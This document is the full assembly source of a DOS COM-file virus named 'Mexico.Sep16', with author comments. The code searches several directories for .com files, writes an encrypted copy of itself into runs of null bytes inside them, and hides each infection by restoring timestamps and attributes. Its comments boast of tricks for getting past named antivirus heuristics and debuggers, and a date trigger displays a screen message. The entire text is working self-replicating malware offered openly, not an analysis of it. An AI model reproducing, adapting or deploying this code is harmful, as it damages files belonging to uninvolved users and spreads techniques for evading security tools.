; Virus name:   Mexico.Sep16
; Author:       Bfr0vrFl0
; Size:         anywhere from 0 to 695 bytes
; Type:         Direct Action COM infector,
; Polymorphism: Sort of (Random Encryption Key)
;               Armored (retro), Cavity (no file growth, Mid-Infector)
; Description:  This virus looks for cavitys (bunch of nulls) in com files
;               in which to place itself. It also has an error handler
;               to avoid those annoying Abort, Fail, Retry Errors.
;               Restores original file stamp and attributes after infection.
;               It's confusing to debug in my opinion, Hope those AV people
;               get dizzy trying dissamble it. I was hoping this virus
;               would be completly Anti-Heuristic but it defeats all of
;               the software except 2. In my tests Norton-AV detected an
;               unknown virus in 1 file out of all the files that where
;               infected (All the com files on my computer) & Dr. Solomon
;               detects it 99.9% of time. Yes I know put my foot in my mouth
;               saying Dr. S was a joke. I don't know what happend it avoided
;               it's heuristics before but then I had to keep bloodhound from
;               detecting it and that messed everthing up. Anyway, It doesn't
;               trigger any of TBAV's Flags and if you try to us TBclean on it
;               the virus code gets run because it changes the INT 1 handler by
;               using segment overrides ,makes a good anti-debug technique too.
;               I tested ds: int cs:21h againt Turbo Debugger 3.2 it worked.
;               For other anti-debug techniques I only used the int 21h mnemonic
;               twice, So I cand find out the CS:IP of the int 21h handler
;               and used a jmp CS:IP instead. That causes debuggers to trace
;               into the handler and act funny. I don't know if using a different
;               decryption key is Polymorphism but thats what I used to mutate
;               the virus from infection to infection.
   

            jmp     top                     ;This is dummy code to make it
            db      222                     ;look like it has been infected

top:        call    findoffset
cryptor     db      00,00                   ;encryption key
findoffset: pop     bp                      ;BP will reference our location
            sub     bp,offset cryptor       ;in memory so we can find data

startcrypt: lea     si,[bp+offset start]    ;point to polymorphic part of virus
            mov     di,si                   ;point di to it too
            mov     cx,((bottom2-start)/2)  ;number of bytes to decrypt

decrypt:    lodsw                           ;load word into ax
            sub     ax,[bp+offset cryptor]  ;subtract cryptor from ax
            stosw                           ;decrypt the word
            int     2                       ;fuck TBAV # Flag
            loop    decrypt                 ;do next word
                                
start:      mov     ax,2501h                ;Change int handler
            lea     dx,[bp+offset int1]     ;point to handler
            db      03eh                    ;trick TBCLEAN into
            db      02eh                    ;running our virus
            int     21h                     ;by changing INT 01h

            push    es                      ;save ES
            mov     ax,3521h                ;Get the int 21h handler
            db      03eh                    ;trick Turbo Debugger
            int     21h                     ;and put them in ES & BX
            mov     [bp+offset int21],bx    ;save it's address for
            mov     [bp+offset int21+2],es  ;the int 21h simulator
            pop     es                      ;restore ES

            mov     ah,02h                  ;This fucks up
            xor     dl,dl                   ;AVG Heuristics up
            call    intsim                  ;but don't ask me why.
                
            mov     dl,08h                  ;output a backspace
            call    intsim                  ;cause F-AVG caused CHR output

            mov     byte ptr [bp+offset filetype],"*" ;avoid TBAV mask flag
        
            mov     ah,047h                    ;get current dir function
            xor     dl,dl                      ;for current drive
            lea     si,[bp+offset curdir]      ;point to dir buffer
            mov     byte ptr [si],"\"          ;make sure there is a \
            inc     si                         ;point past the \
            call    intsim                     ;do it
                
            lea     dx,[bp+offset newdta]      ;point to newdta
            mov     ah,1bh                     ;set dta function
            dec     ah                         ;but avoid TBAV flags
            call    intsim                     ;do it

            push    es                      ;save extra segment
            mov     ax,3524h                ;get int function (int 24h)
            call    intsim                  ;doit
            mov     [bp+offset oldint],bx   ;save original int offset
            mov     [bp+offset oldint+2],es ;save original int segment
            pop     es                      ;restore extra segment
                
            mov     ax,2524h            ;interrupt change function (int 24h)
            lea     dx,[bp+offset errorhandler]     ;point to new handler
            call    intsim                  ;do it

            lea     si,[bp+offset orig_header] ;point to original header
            mov     di,0ffh          ;point to 100h where all com files start
            inc     di                          ;but avoid TBAV flag
            push    di                         ;push it so we can jump to it
            mov     cx,4h                      ;how many bytes to move
            rep     movsb                      ;move si to di

            call    findfiles                  ;find files in current directory

            lea     dx,[bp+offset dir1]        ;point to next directory
            call    chdirec                    ;change to it
            jc      skipdir1                   ;skip if error
                
            call    findfiles                  ;look for more files
                
skipdir1:   lea     dx,[bp+offset dir2]        ;point to next directory
            call    chdirec                    ;change to it
            jc      skipdir3                   ;skip if error

            call    findfiles                  ;find files to fuck

            lea     dx,[bp+offset dir3]        ;point to next directory
            call    chdirec                    ;change to it
            jc      skipdir3                   ;skip it if not there

            call    findfiles                  ;find files to infect

skipdir3:   lea     dx,[bp+offset curdir]      ;point to current directory
            call    chdirec                    ;change to it

            push    ds                         ;save data segment
            mov     dx,[bp+offset oldint]      ;point dx to original int offset
            mov     ds,[bp+offset oldint+2]    ;ds point to original int segment
            mov     ax,2524h              ;change int handler function (int 24h)
            call    intsim                     ;do it
            pop     ds                         ;restore data segment

            mov     ah,1bh                     ;set dta function
            mov     dx,80h                     ;point to default dta
            dec     ah
            call    intsim                     ;set it
                
            mov     ah,2bh                     ;instead of mov ah,2ah
            dec     ah                         ;to avoid TBAV flags
            call    intsim                     ;simulate int 21h
            cmp     dx,0910h                   ;is the our date?
            jne     callhost                   ;no so skip payload

            mov     ah,2bh                     ;its really a 
            inc     ah                         ;2ch (get time)
            call    intsim                     ;simulate int 21h
            cmp     cl,50                      ;is the minute 50 or more
            jl      callhost                   ;if not skip payload

;********************* Payload (just a screen message) ******************

            xor     ax,ax                      ;change to 40x25
            int     10h                        ;& 16 color video mode

            push    es                         ;Save ES
            mov     ax,0b800h                  ;B800h = video memory
            push    ax                         ;Save
            pop     es                         ;ES = B800h
            lea     si,[bp+offset message]     ;point to the message
            mov     di,988                     ;di = middle of screen
            mov     cx,13                      ;number of words (2 bytes)
            rep     movsw                      ;display message 
            pop     es                         ;Restore ES

            xor     ah,ah                      ;wait for key
            int     16h                        ;press (make sure the see)

            mov     ax,0003h                   ;change to 80x25
            int     10h                        ;& 16 color video mode

;********************** End of Payload ************************

callhost:   xor     ax,ax                       ;zero out all registers
            xor     bx,bx                       ;like sub bx,bx
            xor     cx,cx                       ;like mov cx,0
            xor     dx,dx                       ;still dont get it?
            xor     si,si                       ;Damn! commenting
            xor     di,di                       ;your code
            xor     bp,bp                       ;is annoying!

            push    bp                         ;push bp which is 0
            popf                               ;zero out all flags
            sti                                ;enable interrupts
            ret                                ;return to 100h

findfiles:  lea     dx,[bp+offset filetype]    ;point to *.com
            mov     ah,4dh                     ;find first
            mov     cx,27h                     ;archive & hidden & system
            inc     ah                         ;avod TBAV flags
findit:     call    intsim                     ;do it
            jnc     infect                     ;if file was found infect it

nofile:     ret                                ;do next directory

findnext:   mov     ah,4fh                     ;find next file
            jmp     short findit               ;call DOS to do it

infect:     lea     dx,[bp+(offset newdta+1eh)]     ;point to file in dta
            mov     ax,3d00h                        ;open file read access only
            call    intsim                          ;do it

            mov     bx,ax                           ;put handle in BX

            mov     ah,3fh                  ;read from file function
            mov     cx,4h                   ;number of bytes
            lea     dx,[bp+offset orig_header] ;point to orig_header buffer
            call    intsim                  ;save original header

            push    ax                      ;save number of bytes read

            mov     ah,3eh                     ;close file function
            call    intsim                     ;close file in bx
                
            pop     ax                      ;restore number of bytes read

            cmp     ax,4h                   ;where all bytes read
            jne     findnext                ;no so skip
                                                        
            mov     dh,byte ptr [bp+offset check] ;point to 4th byte in header
            cmp     dh,byte ptr [bp+offset signature] ;check if already infected
            je      findnext                    ;no so keep going

            cmp     byte ptr [bp+orig_header],"M" ;check if first byte is an M
            je      findnext                      ;If it's an EXE file skip it
            cmp     byte ptr [bp+orig_header],"Z" ;check if first byte is a Z
            je      findnext                      ;If it's an EXE file skip it

            mov     ah,2dh                  ;get time function
            dec     ah                      ;but avoid TBAV flags
            call    intsim                  ;get it
                
            add     [bp+offset cryptor],dx  ;set cryptor as time
                
            mov     cx,2                    ;number of times to loop
            lea     di,[bp+offset cryptor]
makesure:   cmp     byte ptr [di],0         ;is the cryptor a 0
            jne     dontadd                 ;no so don't add 1 to it
            add     byte ptr [di],1         ;yes so add 1 to it
dontadd:    inc     di                      ;point to next cryptor 
            loop    makesure                ;do it again

            lea     dx,[bp+offset newdta+1eh]       ;point to file in dta

            mov     ax,4302h                        ;set attributes function
            xor     cx,cx                           ;to none
            dec     ax
            call    intsim                          ;do it

            mov     ax,3d02h                        ;open file read/write access
            call    intsim                          ;do it

            xor     di,di                           ;zero out di
            mov     cx,[bp+offset newdta+1ah]       ;get size of file
findnull:   push    cx                              ;save counter
            mov     ah,3fh                  ;read from file function
            mov     cx,1h                   ;number of bytes
            lea     dx,[bp+offset nullfinder]       ;point to buffer
            call    intsim                          ;simulate int 21h

            pop     cx                              ;restore counter
            cmp     byte ptr [bp+offset nullfinder],0h ;was it a null?
            jne     notnull                         ;no so skip
            inc     di                              ;add 1 to di
            cmp     di,bottom-top+4                 ;is it enough space
            je      foundspace                      ;yes so write virus there
            jmp     label3                          ;look for more nulls
notnull:    xor     di,di                           ;not a null so reset count
label3:     loop    findnull                        ;look for more nulls
            cmp     di,4                          ;were there more 4 nulls @EOF?
            jge     foundspace                      ;yes so skip
            mov     di,4                            ;no so di equals 4 

foundspace: mov     ax,4201h                        ;find out
            xor     cx,cx                           ;where the
            xor     dx,dx                           ;file pointer
            call    intsim                          ;is at

            sub     di,4                            ;well make sure we
            sub     ax,di                           ;write after 4 nulls

            mov     dx,ax                           ;make sure
            sub     dx,(64279-(bottom2-top))        ;the file is
            cmp     ax,dx                           ;small enough to 
            jb      okdoit                          ;infect

            call    restattrib                      ;if not restore attribs

            jmp     findnext                        ;go find another file

okdoit:     push    ax                              ;save position
            sub     ax,3                            ;adjust for the jump
            mov     [bp+offset new_header+1],ax     ;save the new header
            pop     dx                              ;dx equals position
            mov     ax,4200h                        ;move file pointer
            call    intsim                          ;to infection point
                
            mov     ah,40h                  ;write to file function
            mov     cx,(start-top)          ;number of bytes
            lea     dx,[bp+offset top]      ;starting from top
            call    intsim                  ;write decryptor to the host
                
            lea     si,[bp+offset start]    ;point to start of virus
            mov     cx,((bottom2-start)/2)  ;number of bytes to write
encrypt:    push    cx                      ;save cx
            mov     ax,[si]                 ;put first byte in ax
            add     ax,[bp+offset cryptor]  ;add cryptor to al (encrypt al)
            push    ax                      ;save ax
            mov     dx,sp                   ;point to saved ax
            mov     ah,40h                  ;write encrypted byte to file
            mov     cx,2                    ;number of bytes to write
            call    intsim                  ;do it
            inc     si                      ;point to next byte
            inc     si                      ;point to next byte
            pop     ax                      ;throw away ax
            pop     cx                      ;restore cx
            loop    encrypt                 ;do next byte

            mov     ax,4200h                ;move file pointer function from SOF
            xor     cx,cx                   ;how many bytes = cx:dx 
            xor     dx,dx                   ;in other words point to SOF
            call    intsim                  ;simulate int 21h

            lea     dx,[bp+offset new_header]  ;point to new header
            mov     cx,2h                      ;how many bytes to write
            inc     cx                         ;which is really
            inc     cx                         ;4 but we are avoiding TBAV
            mov     ah,40h                     ;write to file function
            call    intsim                     ;put a jump to our virus

            mov     cx,[bp+offset newdta+16h]  ;this restores
            mov     ax,5702h                   ;the original
            mov     dx,[bp+offset newdta+18h]  ;file date
            dec     ax                         ;and avoids TBAV flags
            call    intsim                     ;simulate int 21h

restattrib: mov     ah,3eh                     ;close file function
            call    intsim                     ;close file in bx
                    
            lea     dx,[bp+offset newdta+1eh]  ;point to original attribs

            mov     ax,4302h                          ;set attributes function
            mov     cx,byte ptr[bp+(offset newdta+15h)]     ;to original ones
            dec     ax                                ;avoid TBAV flags
            call    intsim                            ;do it
                             
            ret                                ;do next directory

chdirec:    mov     ah,3bh                     ;change direc function
            call    intsim                     ;simulate int 21h
            ret                                ;return to caller

errorhandler:   xor     al,al                      ;tell dos
int1:           iret                               ;theres no prob

intsim:     pushf                              ;this simulates an int
            push    cs                         ;by pushing flags and CS
            call    intsim2                    ;and pushing IP
            ret                                ;return to caller
intsim2:    db      0eah                    ;this jumps to int 21h handler
int21       db      00,00,00,00             ;CS:IP of int 21h handler


;********************** Section for DATA **************************

orig_header     db      0CDh,020h,00h
check           db      00h
                
new_header      db      0e9h,0h,0h
signature       db      222

message         db      173,07,"V",07,"i",07,"v",07,"a",07," ",07
                db      "M",10,"E",10,"X",15,"I",15,"C",12,"O",12,"!",07

filetype        db      00,".com",0
dir1            db      "\dos",0
dir2            db      "\windows",0
dir3            db      "command",0

bottom2:

nullfinder      db      00
oldint          db      4 dup (0)
newdta          db      43 dup (0)                 ;newdta buffer
curdir          db      60 dup (0)                  ;curdir buffer

;***************************************************************************

bottom:
